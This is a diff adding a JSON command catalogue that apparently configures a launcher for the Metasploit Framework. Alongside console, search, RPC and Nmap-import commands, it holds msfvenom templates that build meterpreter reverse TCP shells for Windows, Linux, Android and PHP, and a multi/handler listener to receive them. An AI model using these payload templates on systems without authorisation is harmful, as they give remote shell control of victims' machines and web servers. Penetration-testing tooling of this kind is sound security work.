@@ -1,0 +1,99 @@
+{
+  "name": "Metasploit Framework",
+  "package": "metasploit-framework",
+  "binary": "msfconsole",
+  "commands": [
+    {
+      "id": "start_console",
+      "label": "Start msfconsole",
+      "cmd_template": ["msfconsole"],
+      "inputs": []
+    },
+    {
+      "id": "start_console_db",
+      "label": "Start msfconsole (connect to DB)",
+      "cmd_template": ["msfconsole", "-q", "-x", "db_status;"],
+      "inputs": []
+    },
+    {
+      "id": "search_exploits",
+      "label": "Search for an exploit",
+      "cmd_template": ["msfconsole", "-q", "-x", "search {search_term}; exit"],
+      "inputs": [
+        {"name": "search_term", "prompt": "Enter search term (e.g., eternalblue, smb)", "type": "string", "required": true}
+      ]
+    },
+    {
+      "id": "msfvenom_list_payloads",
+      "label": "msfvenom - List all payloads",
+      "cmd_template": ["msfvenom", "-l", "payloads"],
+      "inputs": []
+    },
+    {
+      "id": "msfvenom_windows_rev_tcp",
+      "label": "msfvenom - Generate Windows Reverse TCP Shell (exe)",
+      "cmd_template": ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", "LHOST={lhost}", "LPORT={lport}", "-f", "exe", "-o", "{outfile}"],
+      "inputs": [
+        {"name": "lhost", "prompt": "Enter LHOST (your IP)", "type": "ip", "required": true},
+        {"name": "lport", "prompt": "Enter LPORT (listening port)", "type": "int", "required": true, "default": "4444"},
+        {"name": "outfile", "prompt": "Enter output filename", "type": "path", "required": true, "default": "shell.exe"}
+      ]
+    },
+    {
+      "id": "msfvenom_linux_rev_tcp",
+      "label": "msfvenom - Generate Linux Reverse TCP Shell (elf)",
+      "cmd_template": ["msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp", "LHOST={lhost}", "LPORT={lport}", "-f", "elf", "-o", "{outfile}"],
+      "inputs": [
+        {"name": "lhost", "prompt": "Enter LHOST (your IP)", "type": "ip", "required": true},
+        {"name": "lport", "prompt": "Enter LPORT (listening port)", "type": "int", "required": true, "default": "4444"},
+        {"name": "outfile", "prompt": "Enter output filename", "type": "path", "required": true, "default": "shell.elf"}
+      ]
+    },
+    {
+      "id": "msfvenom_android_rev_tcp",
+      "label": "msfvenom - Generate Android Reverse TCP Payload (apk)",
+      "cmd_template": ["msfvenom", "-p", "android/meterpreter/reverse_tcp", "LHOST={lhost}", "LPORT={lport}", "-o", "{outfile}"],
+       "inputs": [
+        {"name": "lhost", "prompt": "Enter LHOST (your IP)", "type": "ip", "required": true},
+        {"name": "lport", "prompt": "Enter LPORT (listening port)", "type": "int", "required": true, "default": "4444"},
+        {"name": "outfile", "prompt": "Enter output filename", "type": "path", "required": true, "default": "payload.apk"}
+      ]
+    },
+    {
+      "id": "msfvenom_php_rev_tcp",
+      "label": "msfvenom - Generate PHP Reverse TCP Payload",
+      "cmd_template": ["msfvenom", "-p", "php/meterpreter/reverse_tcp", "LHOST={lhost}", "LPORT={lport}", "-f", "raw", "-o", "{outfile}"],
+      "inputs": [
+        {"name": "lhost", "prompt": "Enter LHOST (your IP)", "type": "ip", "required": true},
+        {"name": "lport", "prompt": "Enter LPORT (listening port)", "type": "int", "required": true, "default": "4444"},
+        {"name": "outfile", "prompt": "Enter output filename", "type": "path", "required": true, "default": "shell.php"}
+      ]
+    },
+    {
+      "id": "multi_handler_listener",
+      "label": "Start a multi/handler listener",
+      "cmd_template": ["msfconsole", "-q", "-x", "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run"],
+      "inputs": [
+        {"name": "payload", "prompt": "Enter the PAYLOAD to listen for", "type": "string", "required": true, "default": "windows/x64/meterpreter/reverse_tcp"},
+        {"name": "lhost", "prompt": "Enter LHOST (your IP)", "type": "ip", "required": true, "default": "0.0.0.0"},
+        {"name": "lport", "prompt": "Enter LPORT (listening port)", "type": "int", "required": true, "default": "4444"}
+      ]
+    },
+    {
+      "id": "start_msfrpcd",
+      "label": "Start Metasploit RPC Daemon (msfrpcd)",
+      "cmd_template": ["msfrpcd", "-P", "{password}", "-S"],
+      "inputs": [
+        {"name": "password", "prompt": "Enter a password for the RPC service", "type": "string", "required": true}
+      ]
+    },
+    {
+        "id": "db_nmap_import",
+        "label": "Import an Nmap XML scan into the database",
+        "cmd_template": ["msfconsole", "-q", "-x", "db_import {nmap_xml_file}; exit"],
+        "inputs": [
+            {"name": "nmap_xml_file", "prompt": "Enter the path to the Nmap XML output file", "type": "path", "required": true}
+        ]
+    }
+  ]
+}
